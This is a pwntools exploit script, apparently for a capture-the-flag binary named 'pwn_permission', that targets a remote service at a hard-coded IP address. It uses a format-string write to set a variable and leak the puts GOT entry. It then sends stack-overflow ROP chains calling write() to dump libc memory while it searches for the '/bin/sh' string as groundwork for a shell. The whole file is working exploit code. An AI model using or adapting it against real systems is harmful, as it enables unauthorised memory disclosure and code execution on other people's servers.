from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# The issue is that the format string %s reads until null byte,
# so it reads multiple GOT entries at once.
# Let me use a simpler approach: just leak puts and use the known offset.

# From previous analysis:
# puts_offset = 0x6d1e0 (verified - gives page-aligned libc base)
# libc.rip returns these for puts=0x6d1e0:
# system: 0x41360, str_bin_sh: 0x18b363 (for most versions)
# system: 0x41370 (for 9.7 version)
# system: 0x41360, str_bin_sh: 0x18c363 (for 9.16 version)

# But /bin/sh at 0x18b363 was WRONG when I tested it!
# Let me verify by reading the actual bytes at different /bin/sh offsets

target_val_addr = 0x804c030
puts_got = elf.got['puts']
got_base = 0x804c000
bss_buf = 0x804c040
write_plt = elf.plt['write']
pop4ret = 0x8049380

PUTS_OFFSET = 0x6d1e0

# Format string to set target_val=5 and leak puts
fmt_payload = b'%5c%7$hhnAAA'
fmt_payload += p32(target_val_addr)
fmt_payload += p32(puts_got)
fmt_payload += b'%8$s'

import time

# Try different /bin/sh offsets
binsh_offsets = [
    0x18b363,
    0x18c363,
    0x17b8cf,
    0x17b9ce,
    0x18ce63,
    0x18ce57,
    0x1b3d9a,
    0x1b3d9b,
    0x13880a,
    0x158e8a,
]

for binsh_off in binsh_offsets:
    try:
        conn = remote('39.96.193.120', 10000)
        conn.recv(timeout=5)
        conn.send(fmt_payload)
        time.sleep(2)
        response = conn.recv(timeout=5)
        
        if b'Input:' not in response:
            conn.close()
            continue
        
        idx = response.find(b'here.\n')
        after_here = response[idx+6:]
        input_idx = after_here.find(b'Input:')
        fmt_output = after_here[:input_idx]
        leaked = fmt_output[16:]
        puts_leak = u32(leaked[:4])
        libc_base = puts_leak - PUTS_OFFSET
        binsh_addr = libc_base + binsh_off
        
        # Read 8 bytes at binsh_addr
        payload = b'A' * 140
        payload += p32(got_base)
        payload += p32(bss_buf)
        payload += p32(write_plt)
        payload += p32(pop4ret)
        payload += p32(1)
        payload += p32(binsh_addr)
        payload += p32(8)
        
        conn.send(payload)
        time.sleep(0.5)
        
        try:
            data = conn.recv(8, timeout=2)
            if data.startswith(b'/bin/sh'):
                log.success(f"/bin/sh found at offset 0x{binsh_off:x}! Data: {data}")
            elif data.startswith(b'sh'):
                log.info(f"0x{binsh_off:x}: 'sh' found: {data}")
            else:
                log.info(f"0x{binsh_off:x}: {data.hex()}")
        except:
            log.info(f"0x{binsh_off:x}: read failed")
        
        conn.close()
    except:
        continue

# Also try searching for /bin/sh by scanning libc memory
log.info("\nScanning for /bin/sh string in libc...")

conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)
conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET

log.info(f"libc_base: 0x{libc_base:x}")

# Scan for /bin/sh in the range 0x170000 - 0x1a0000
# /bin/sh = 2f 62 69 6e 2f 73 68 00
for page in range(0x170000, 0x1a0000, 0x1000):
    try:
        addr = libc_base + page
        payload = b'A' * 140
        payload += p32(got_base)
        payload += p32(bss_buf)
        payload += p32(write_plt)
        payload += p32(pop4ret)
        payload += p32(1)
        payload += p32(addr)
        payload += p32(0x1000)
        
        conn.send(payload)
        time.sleep(0.3)
        
        try:
            data = conn.recv(0x1000, timeout=1)
            if b'/bin/sh' in data:
                offset = data.find(b'/bin/sh')
                binsh_offset = page + offset
                log.success(f"Found /bin/sh at offset 0x{binsh_offset:x} (addr 0x{libc_base + binsh_offset:x})")
                break
        except:
            pass
    except:
        # Reconnect
        try:
            conn.close()
        except:
            pass
        conn = remote('39.96.193.120', 10000)
        conn.recv(timeout=5)
        conn.send(fmt_payload)
        time.sleep(2)
        conn.recv(timeout=5)

conn.close()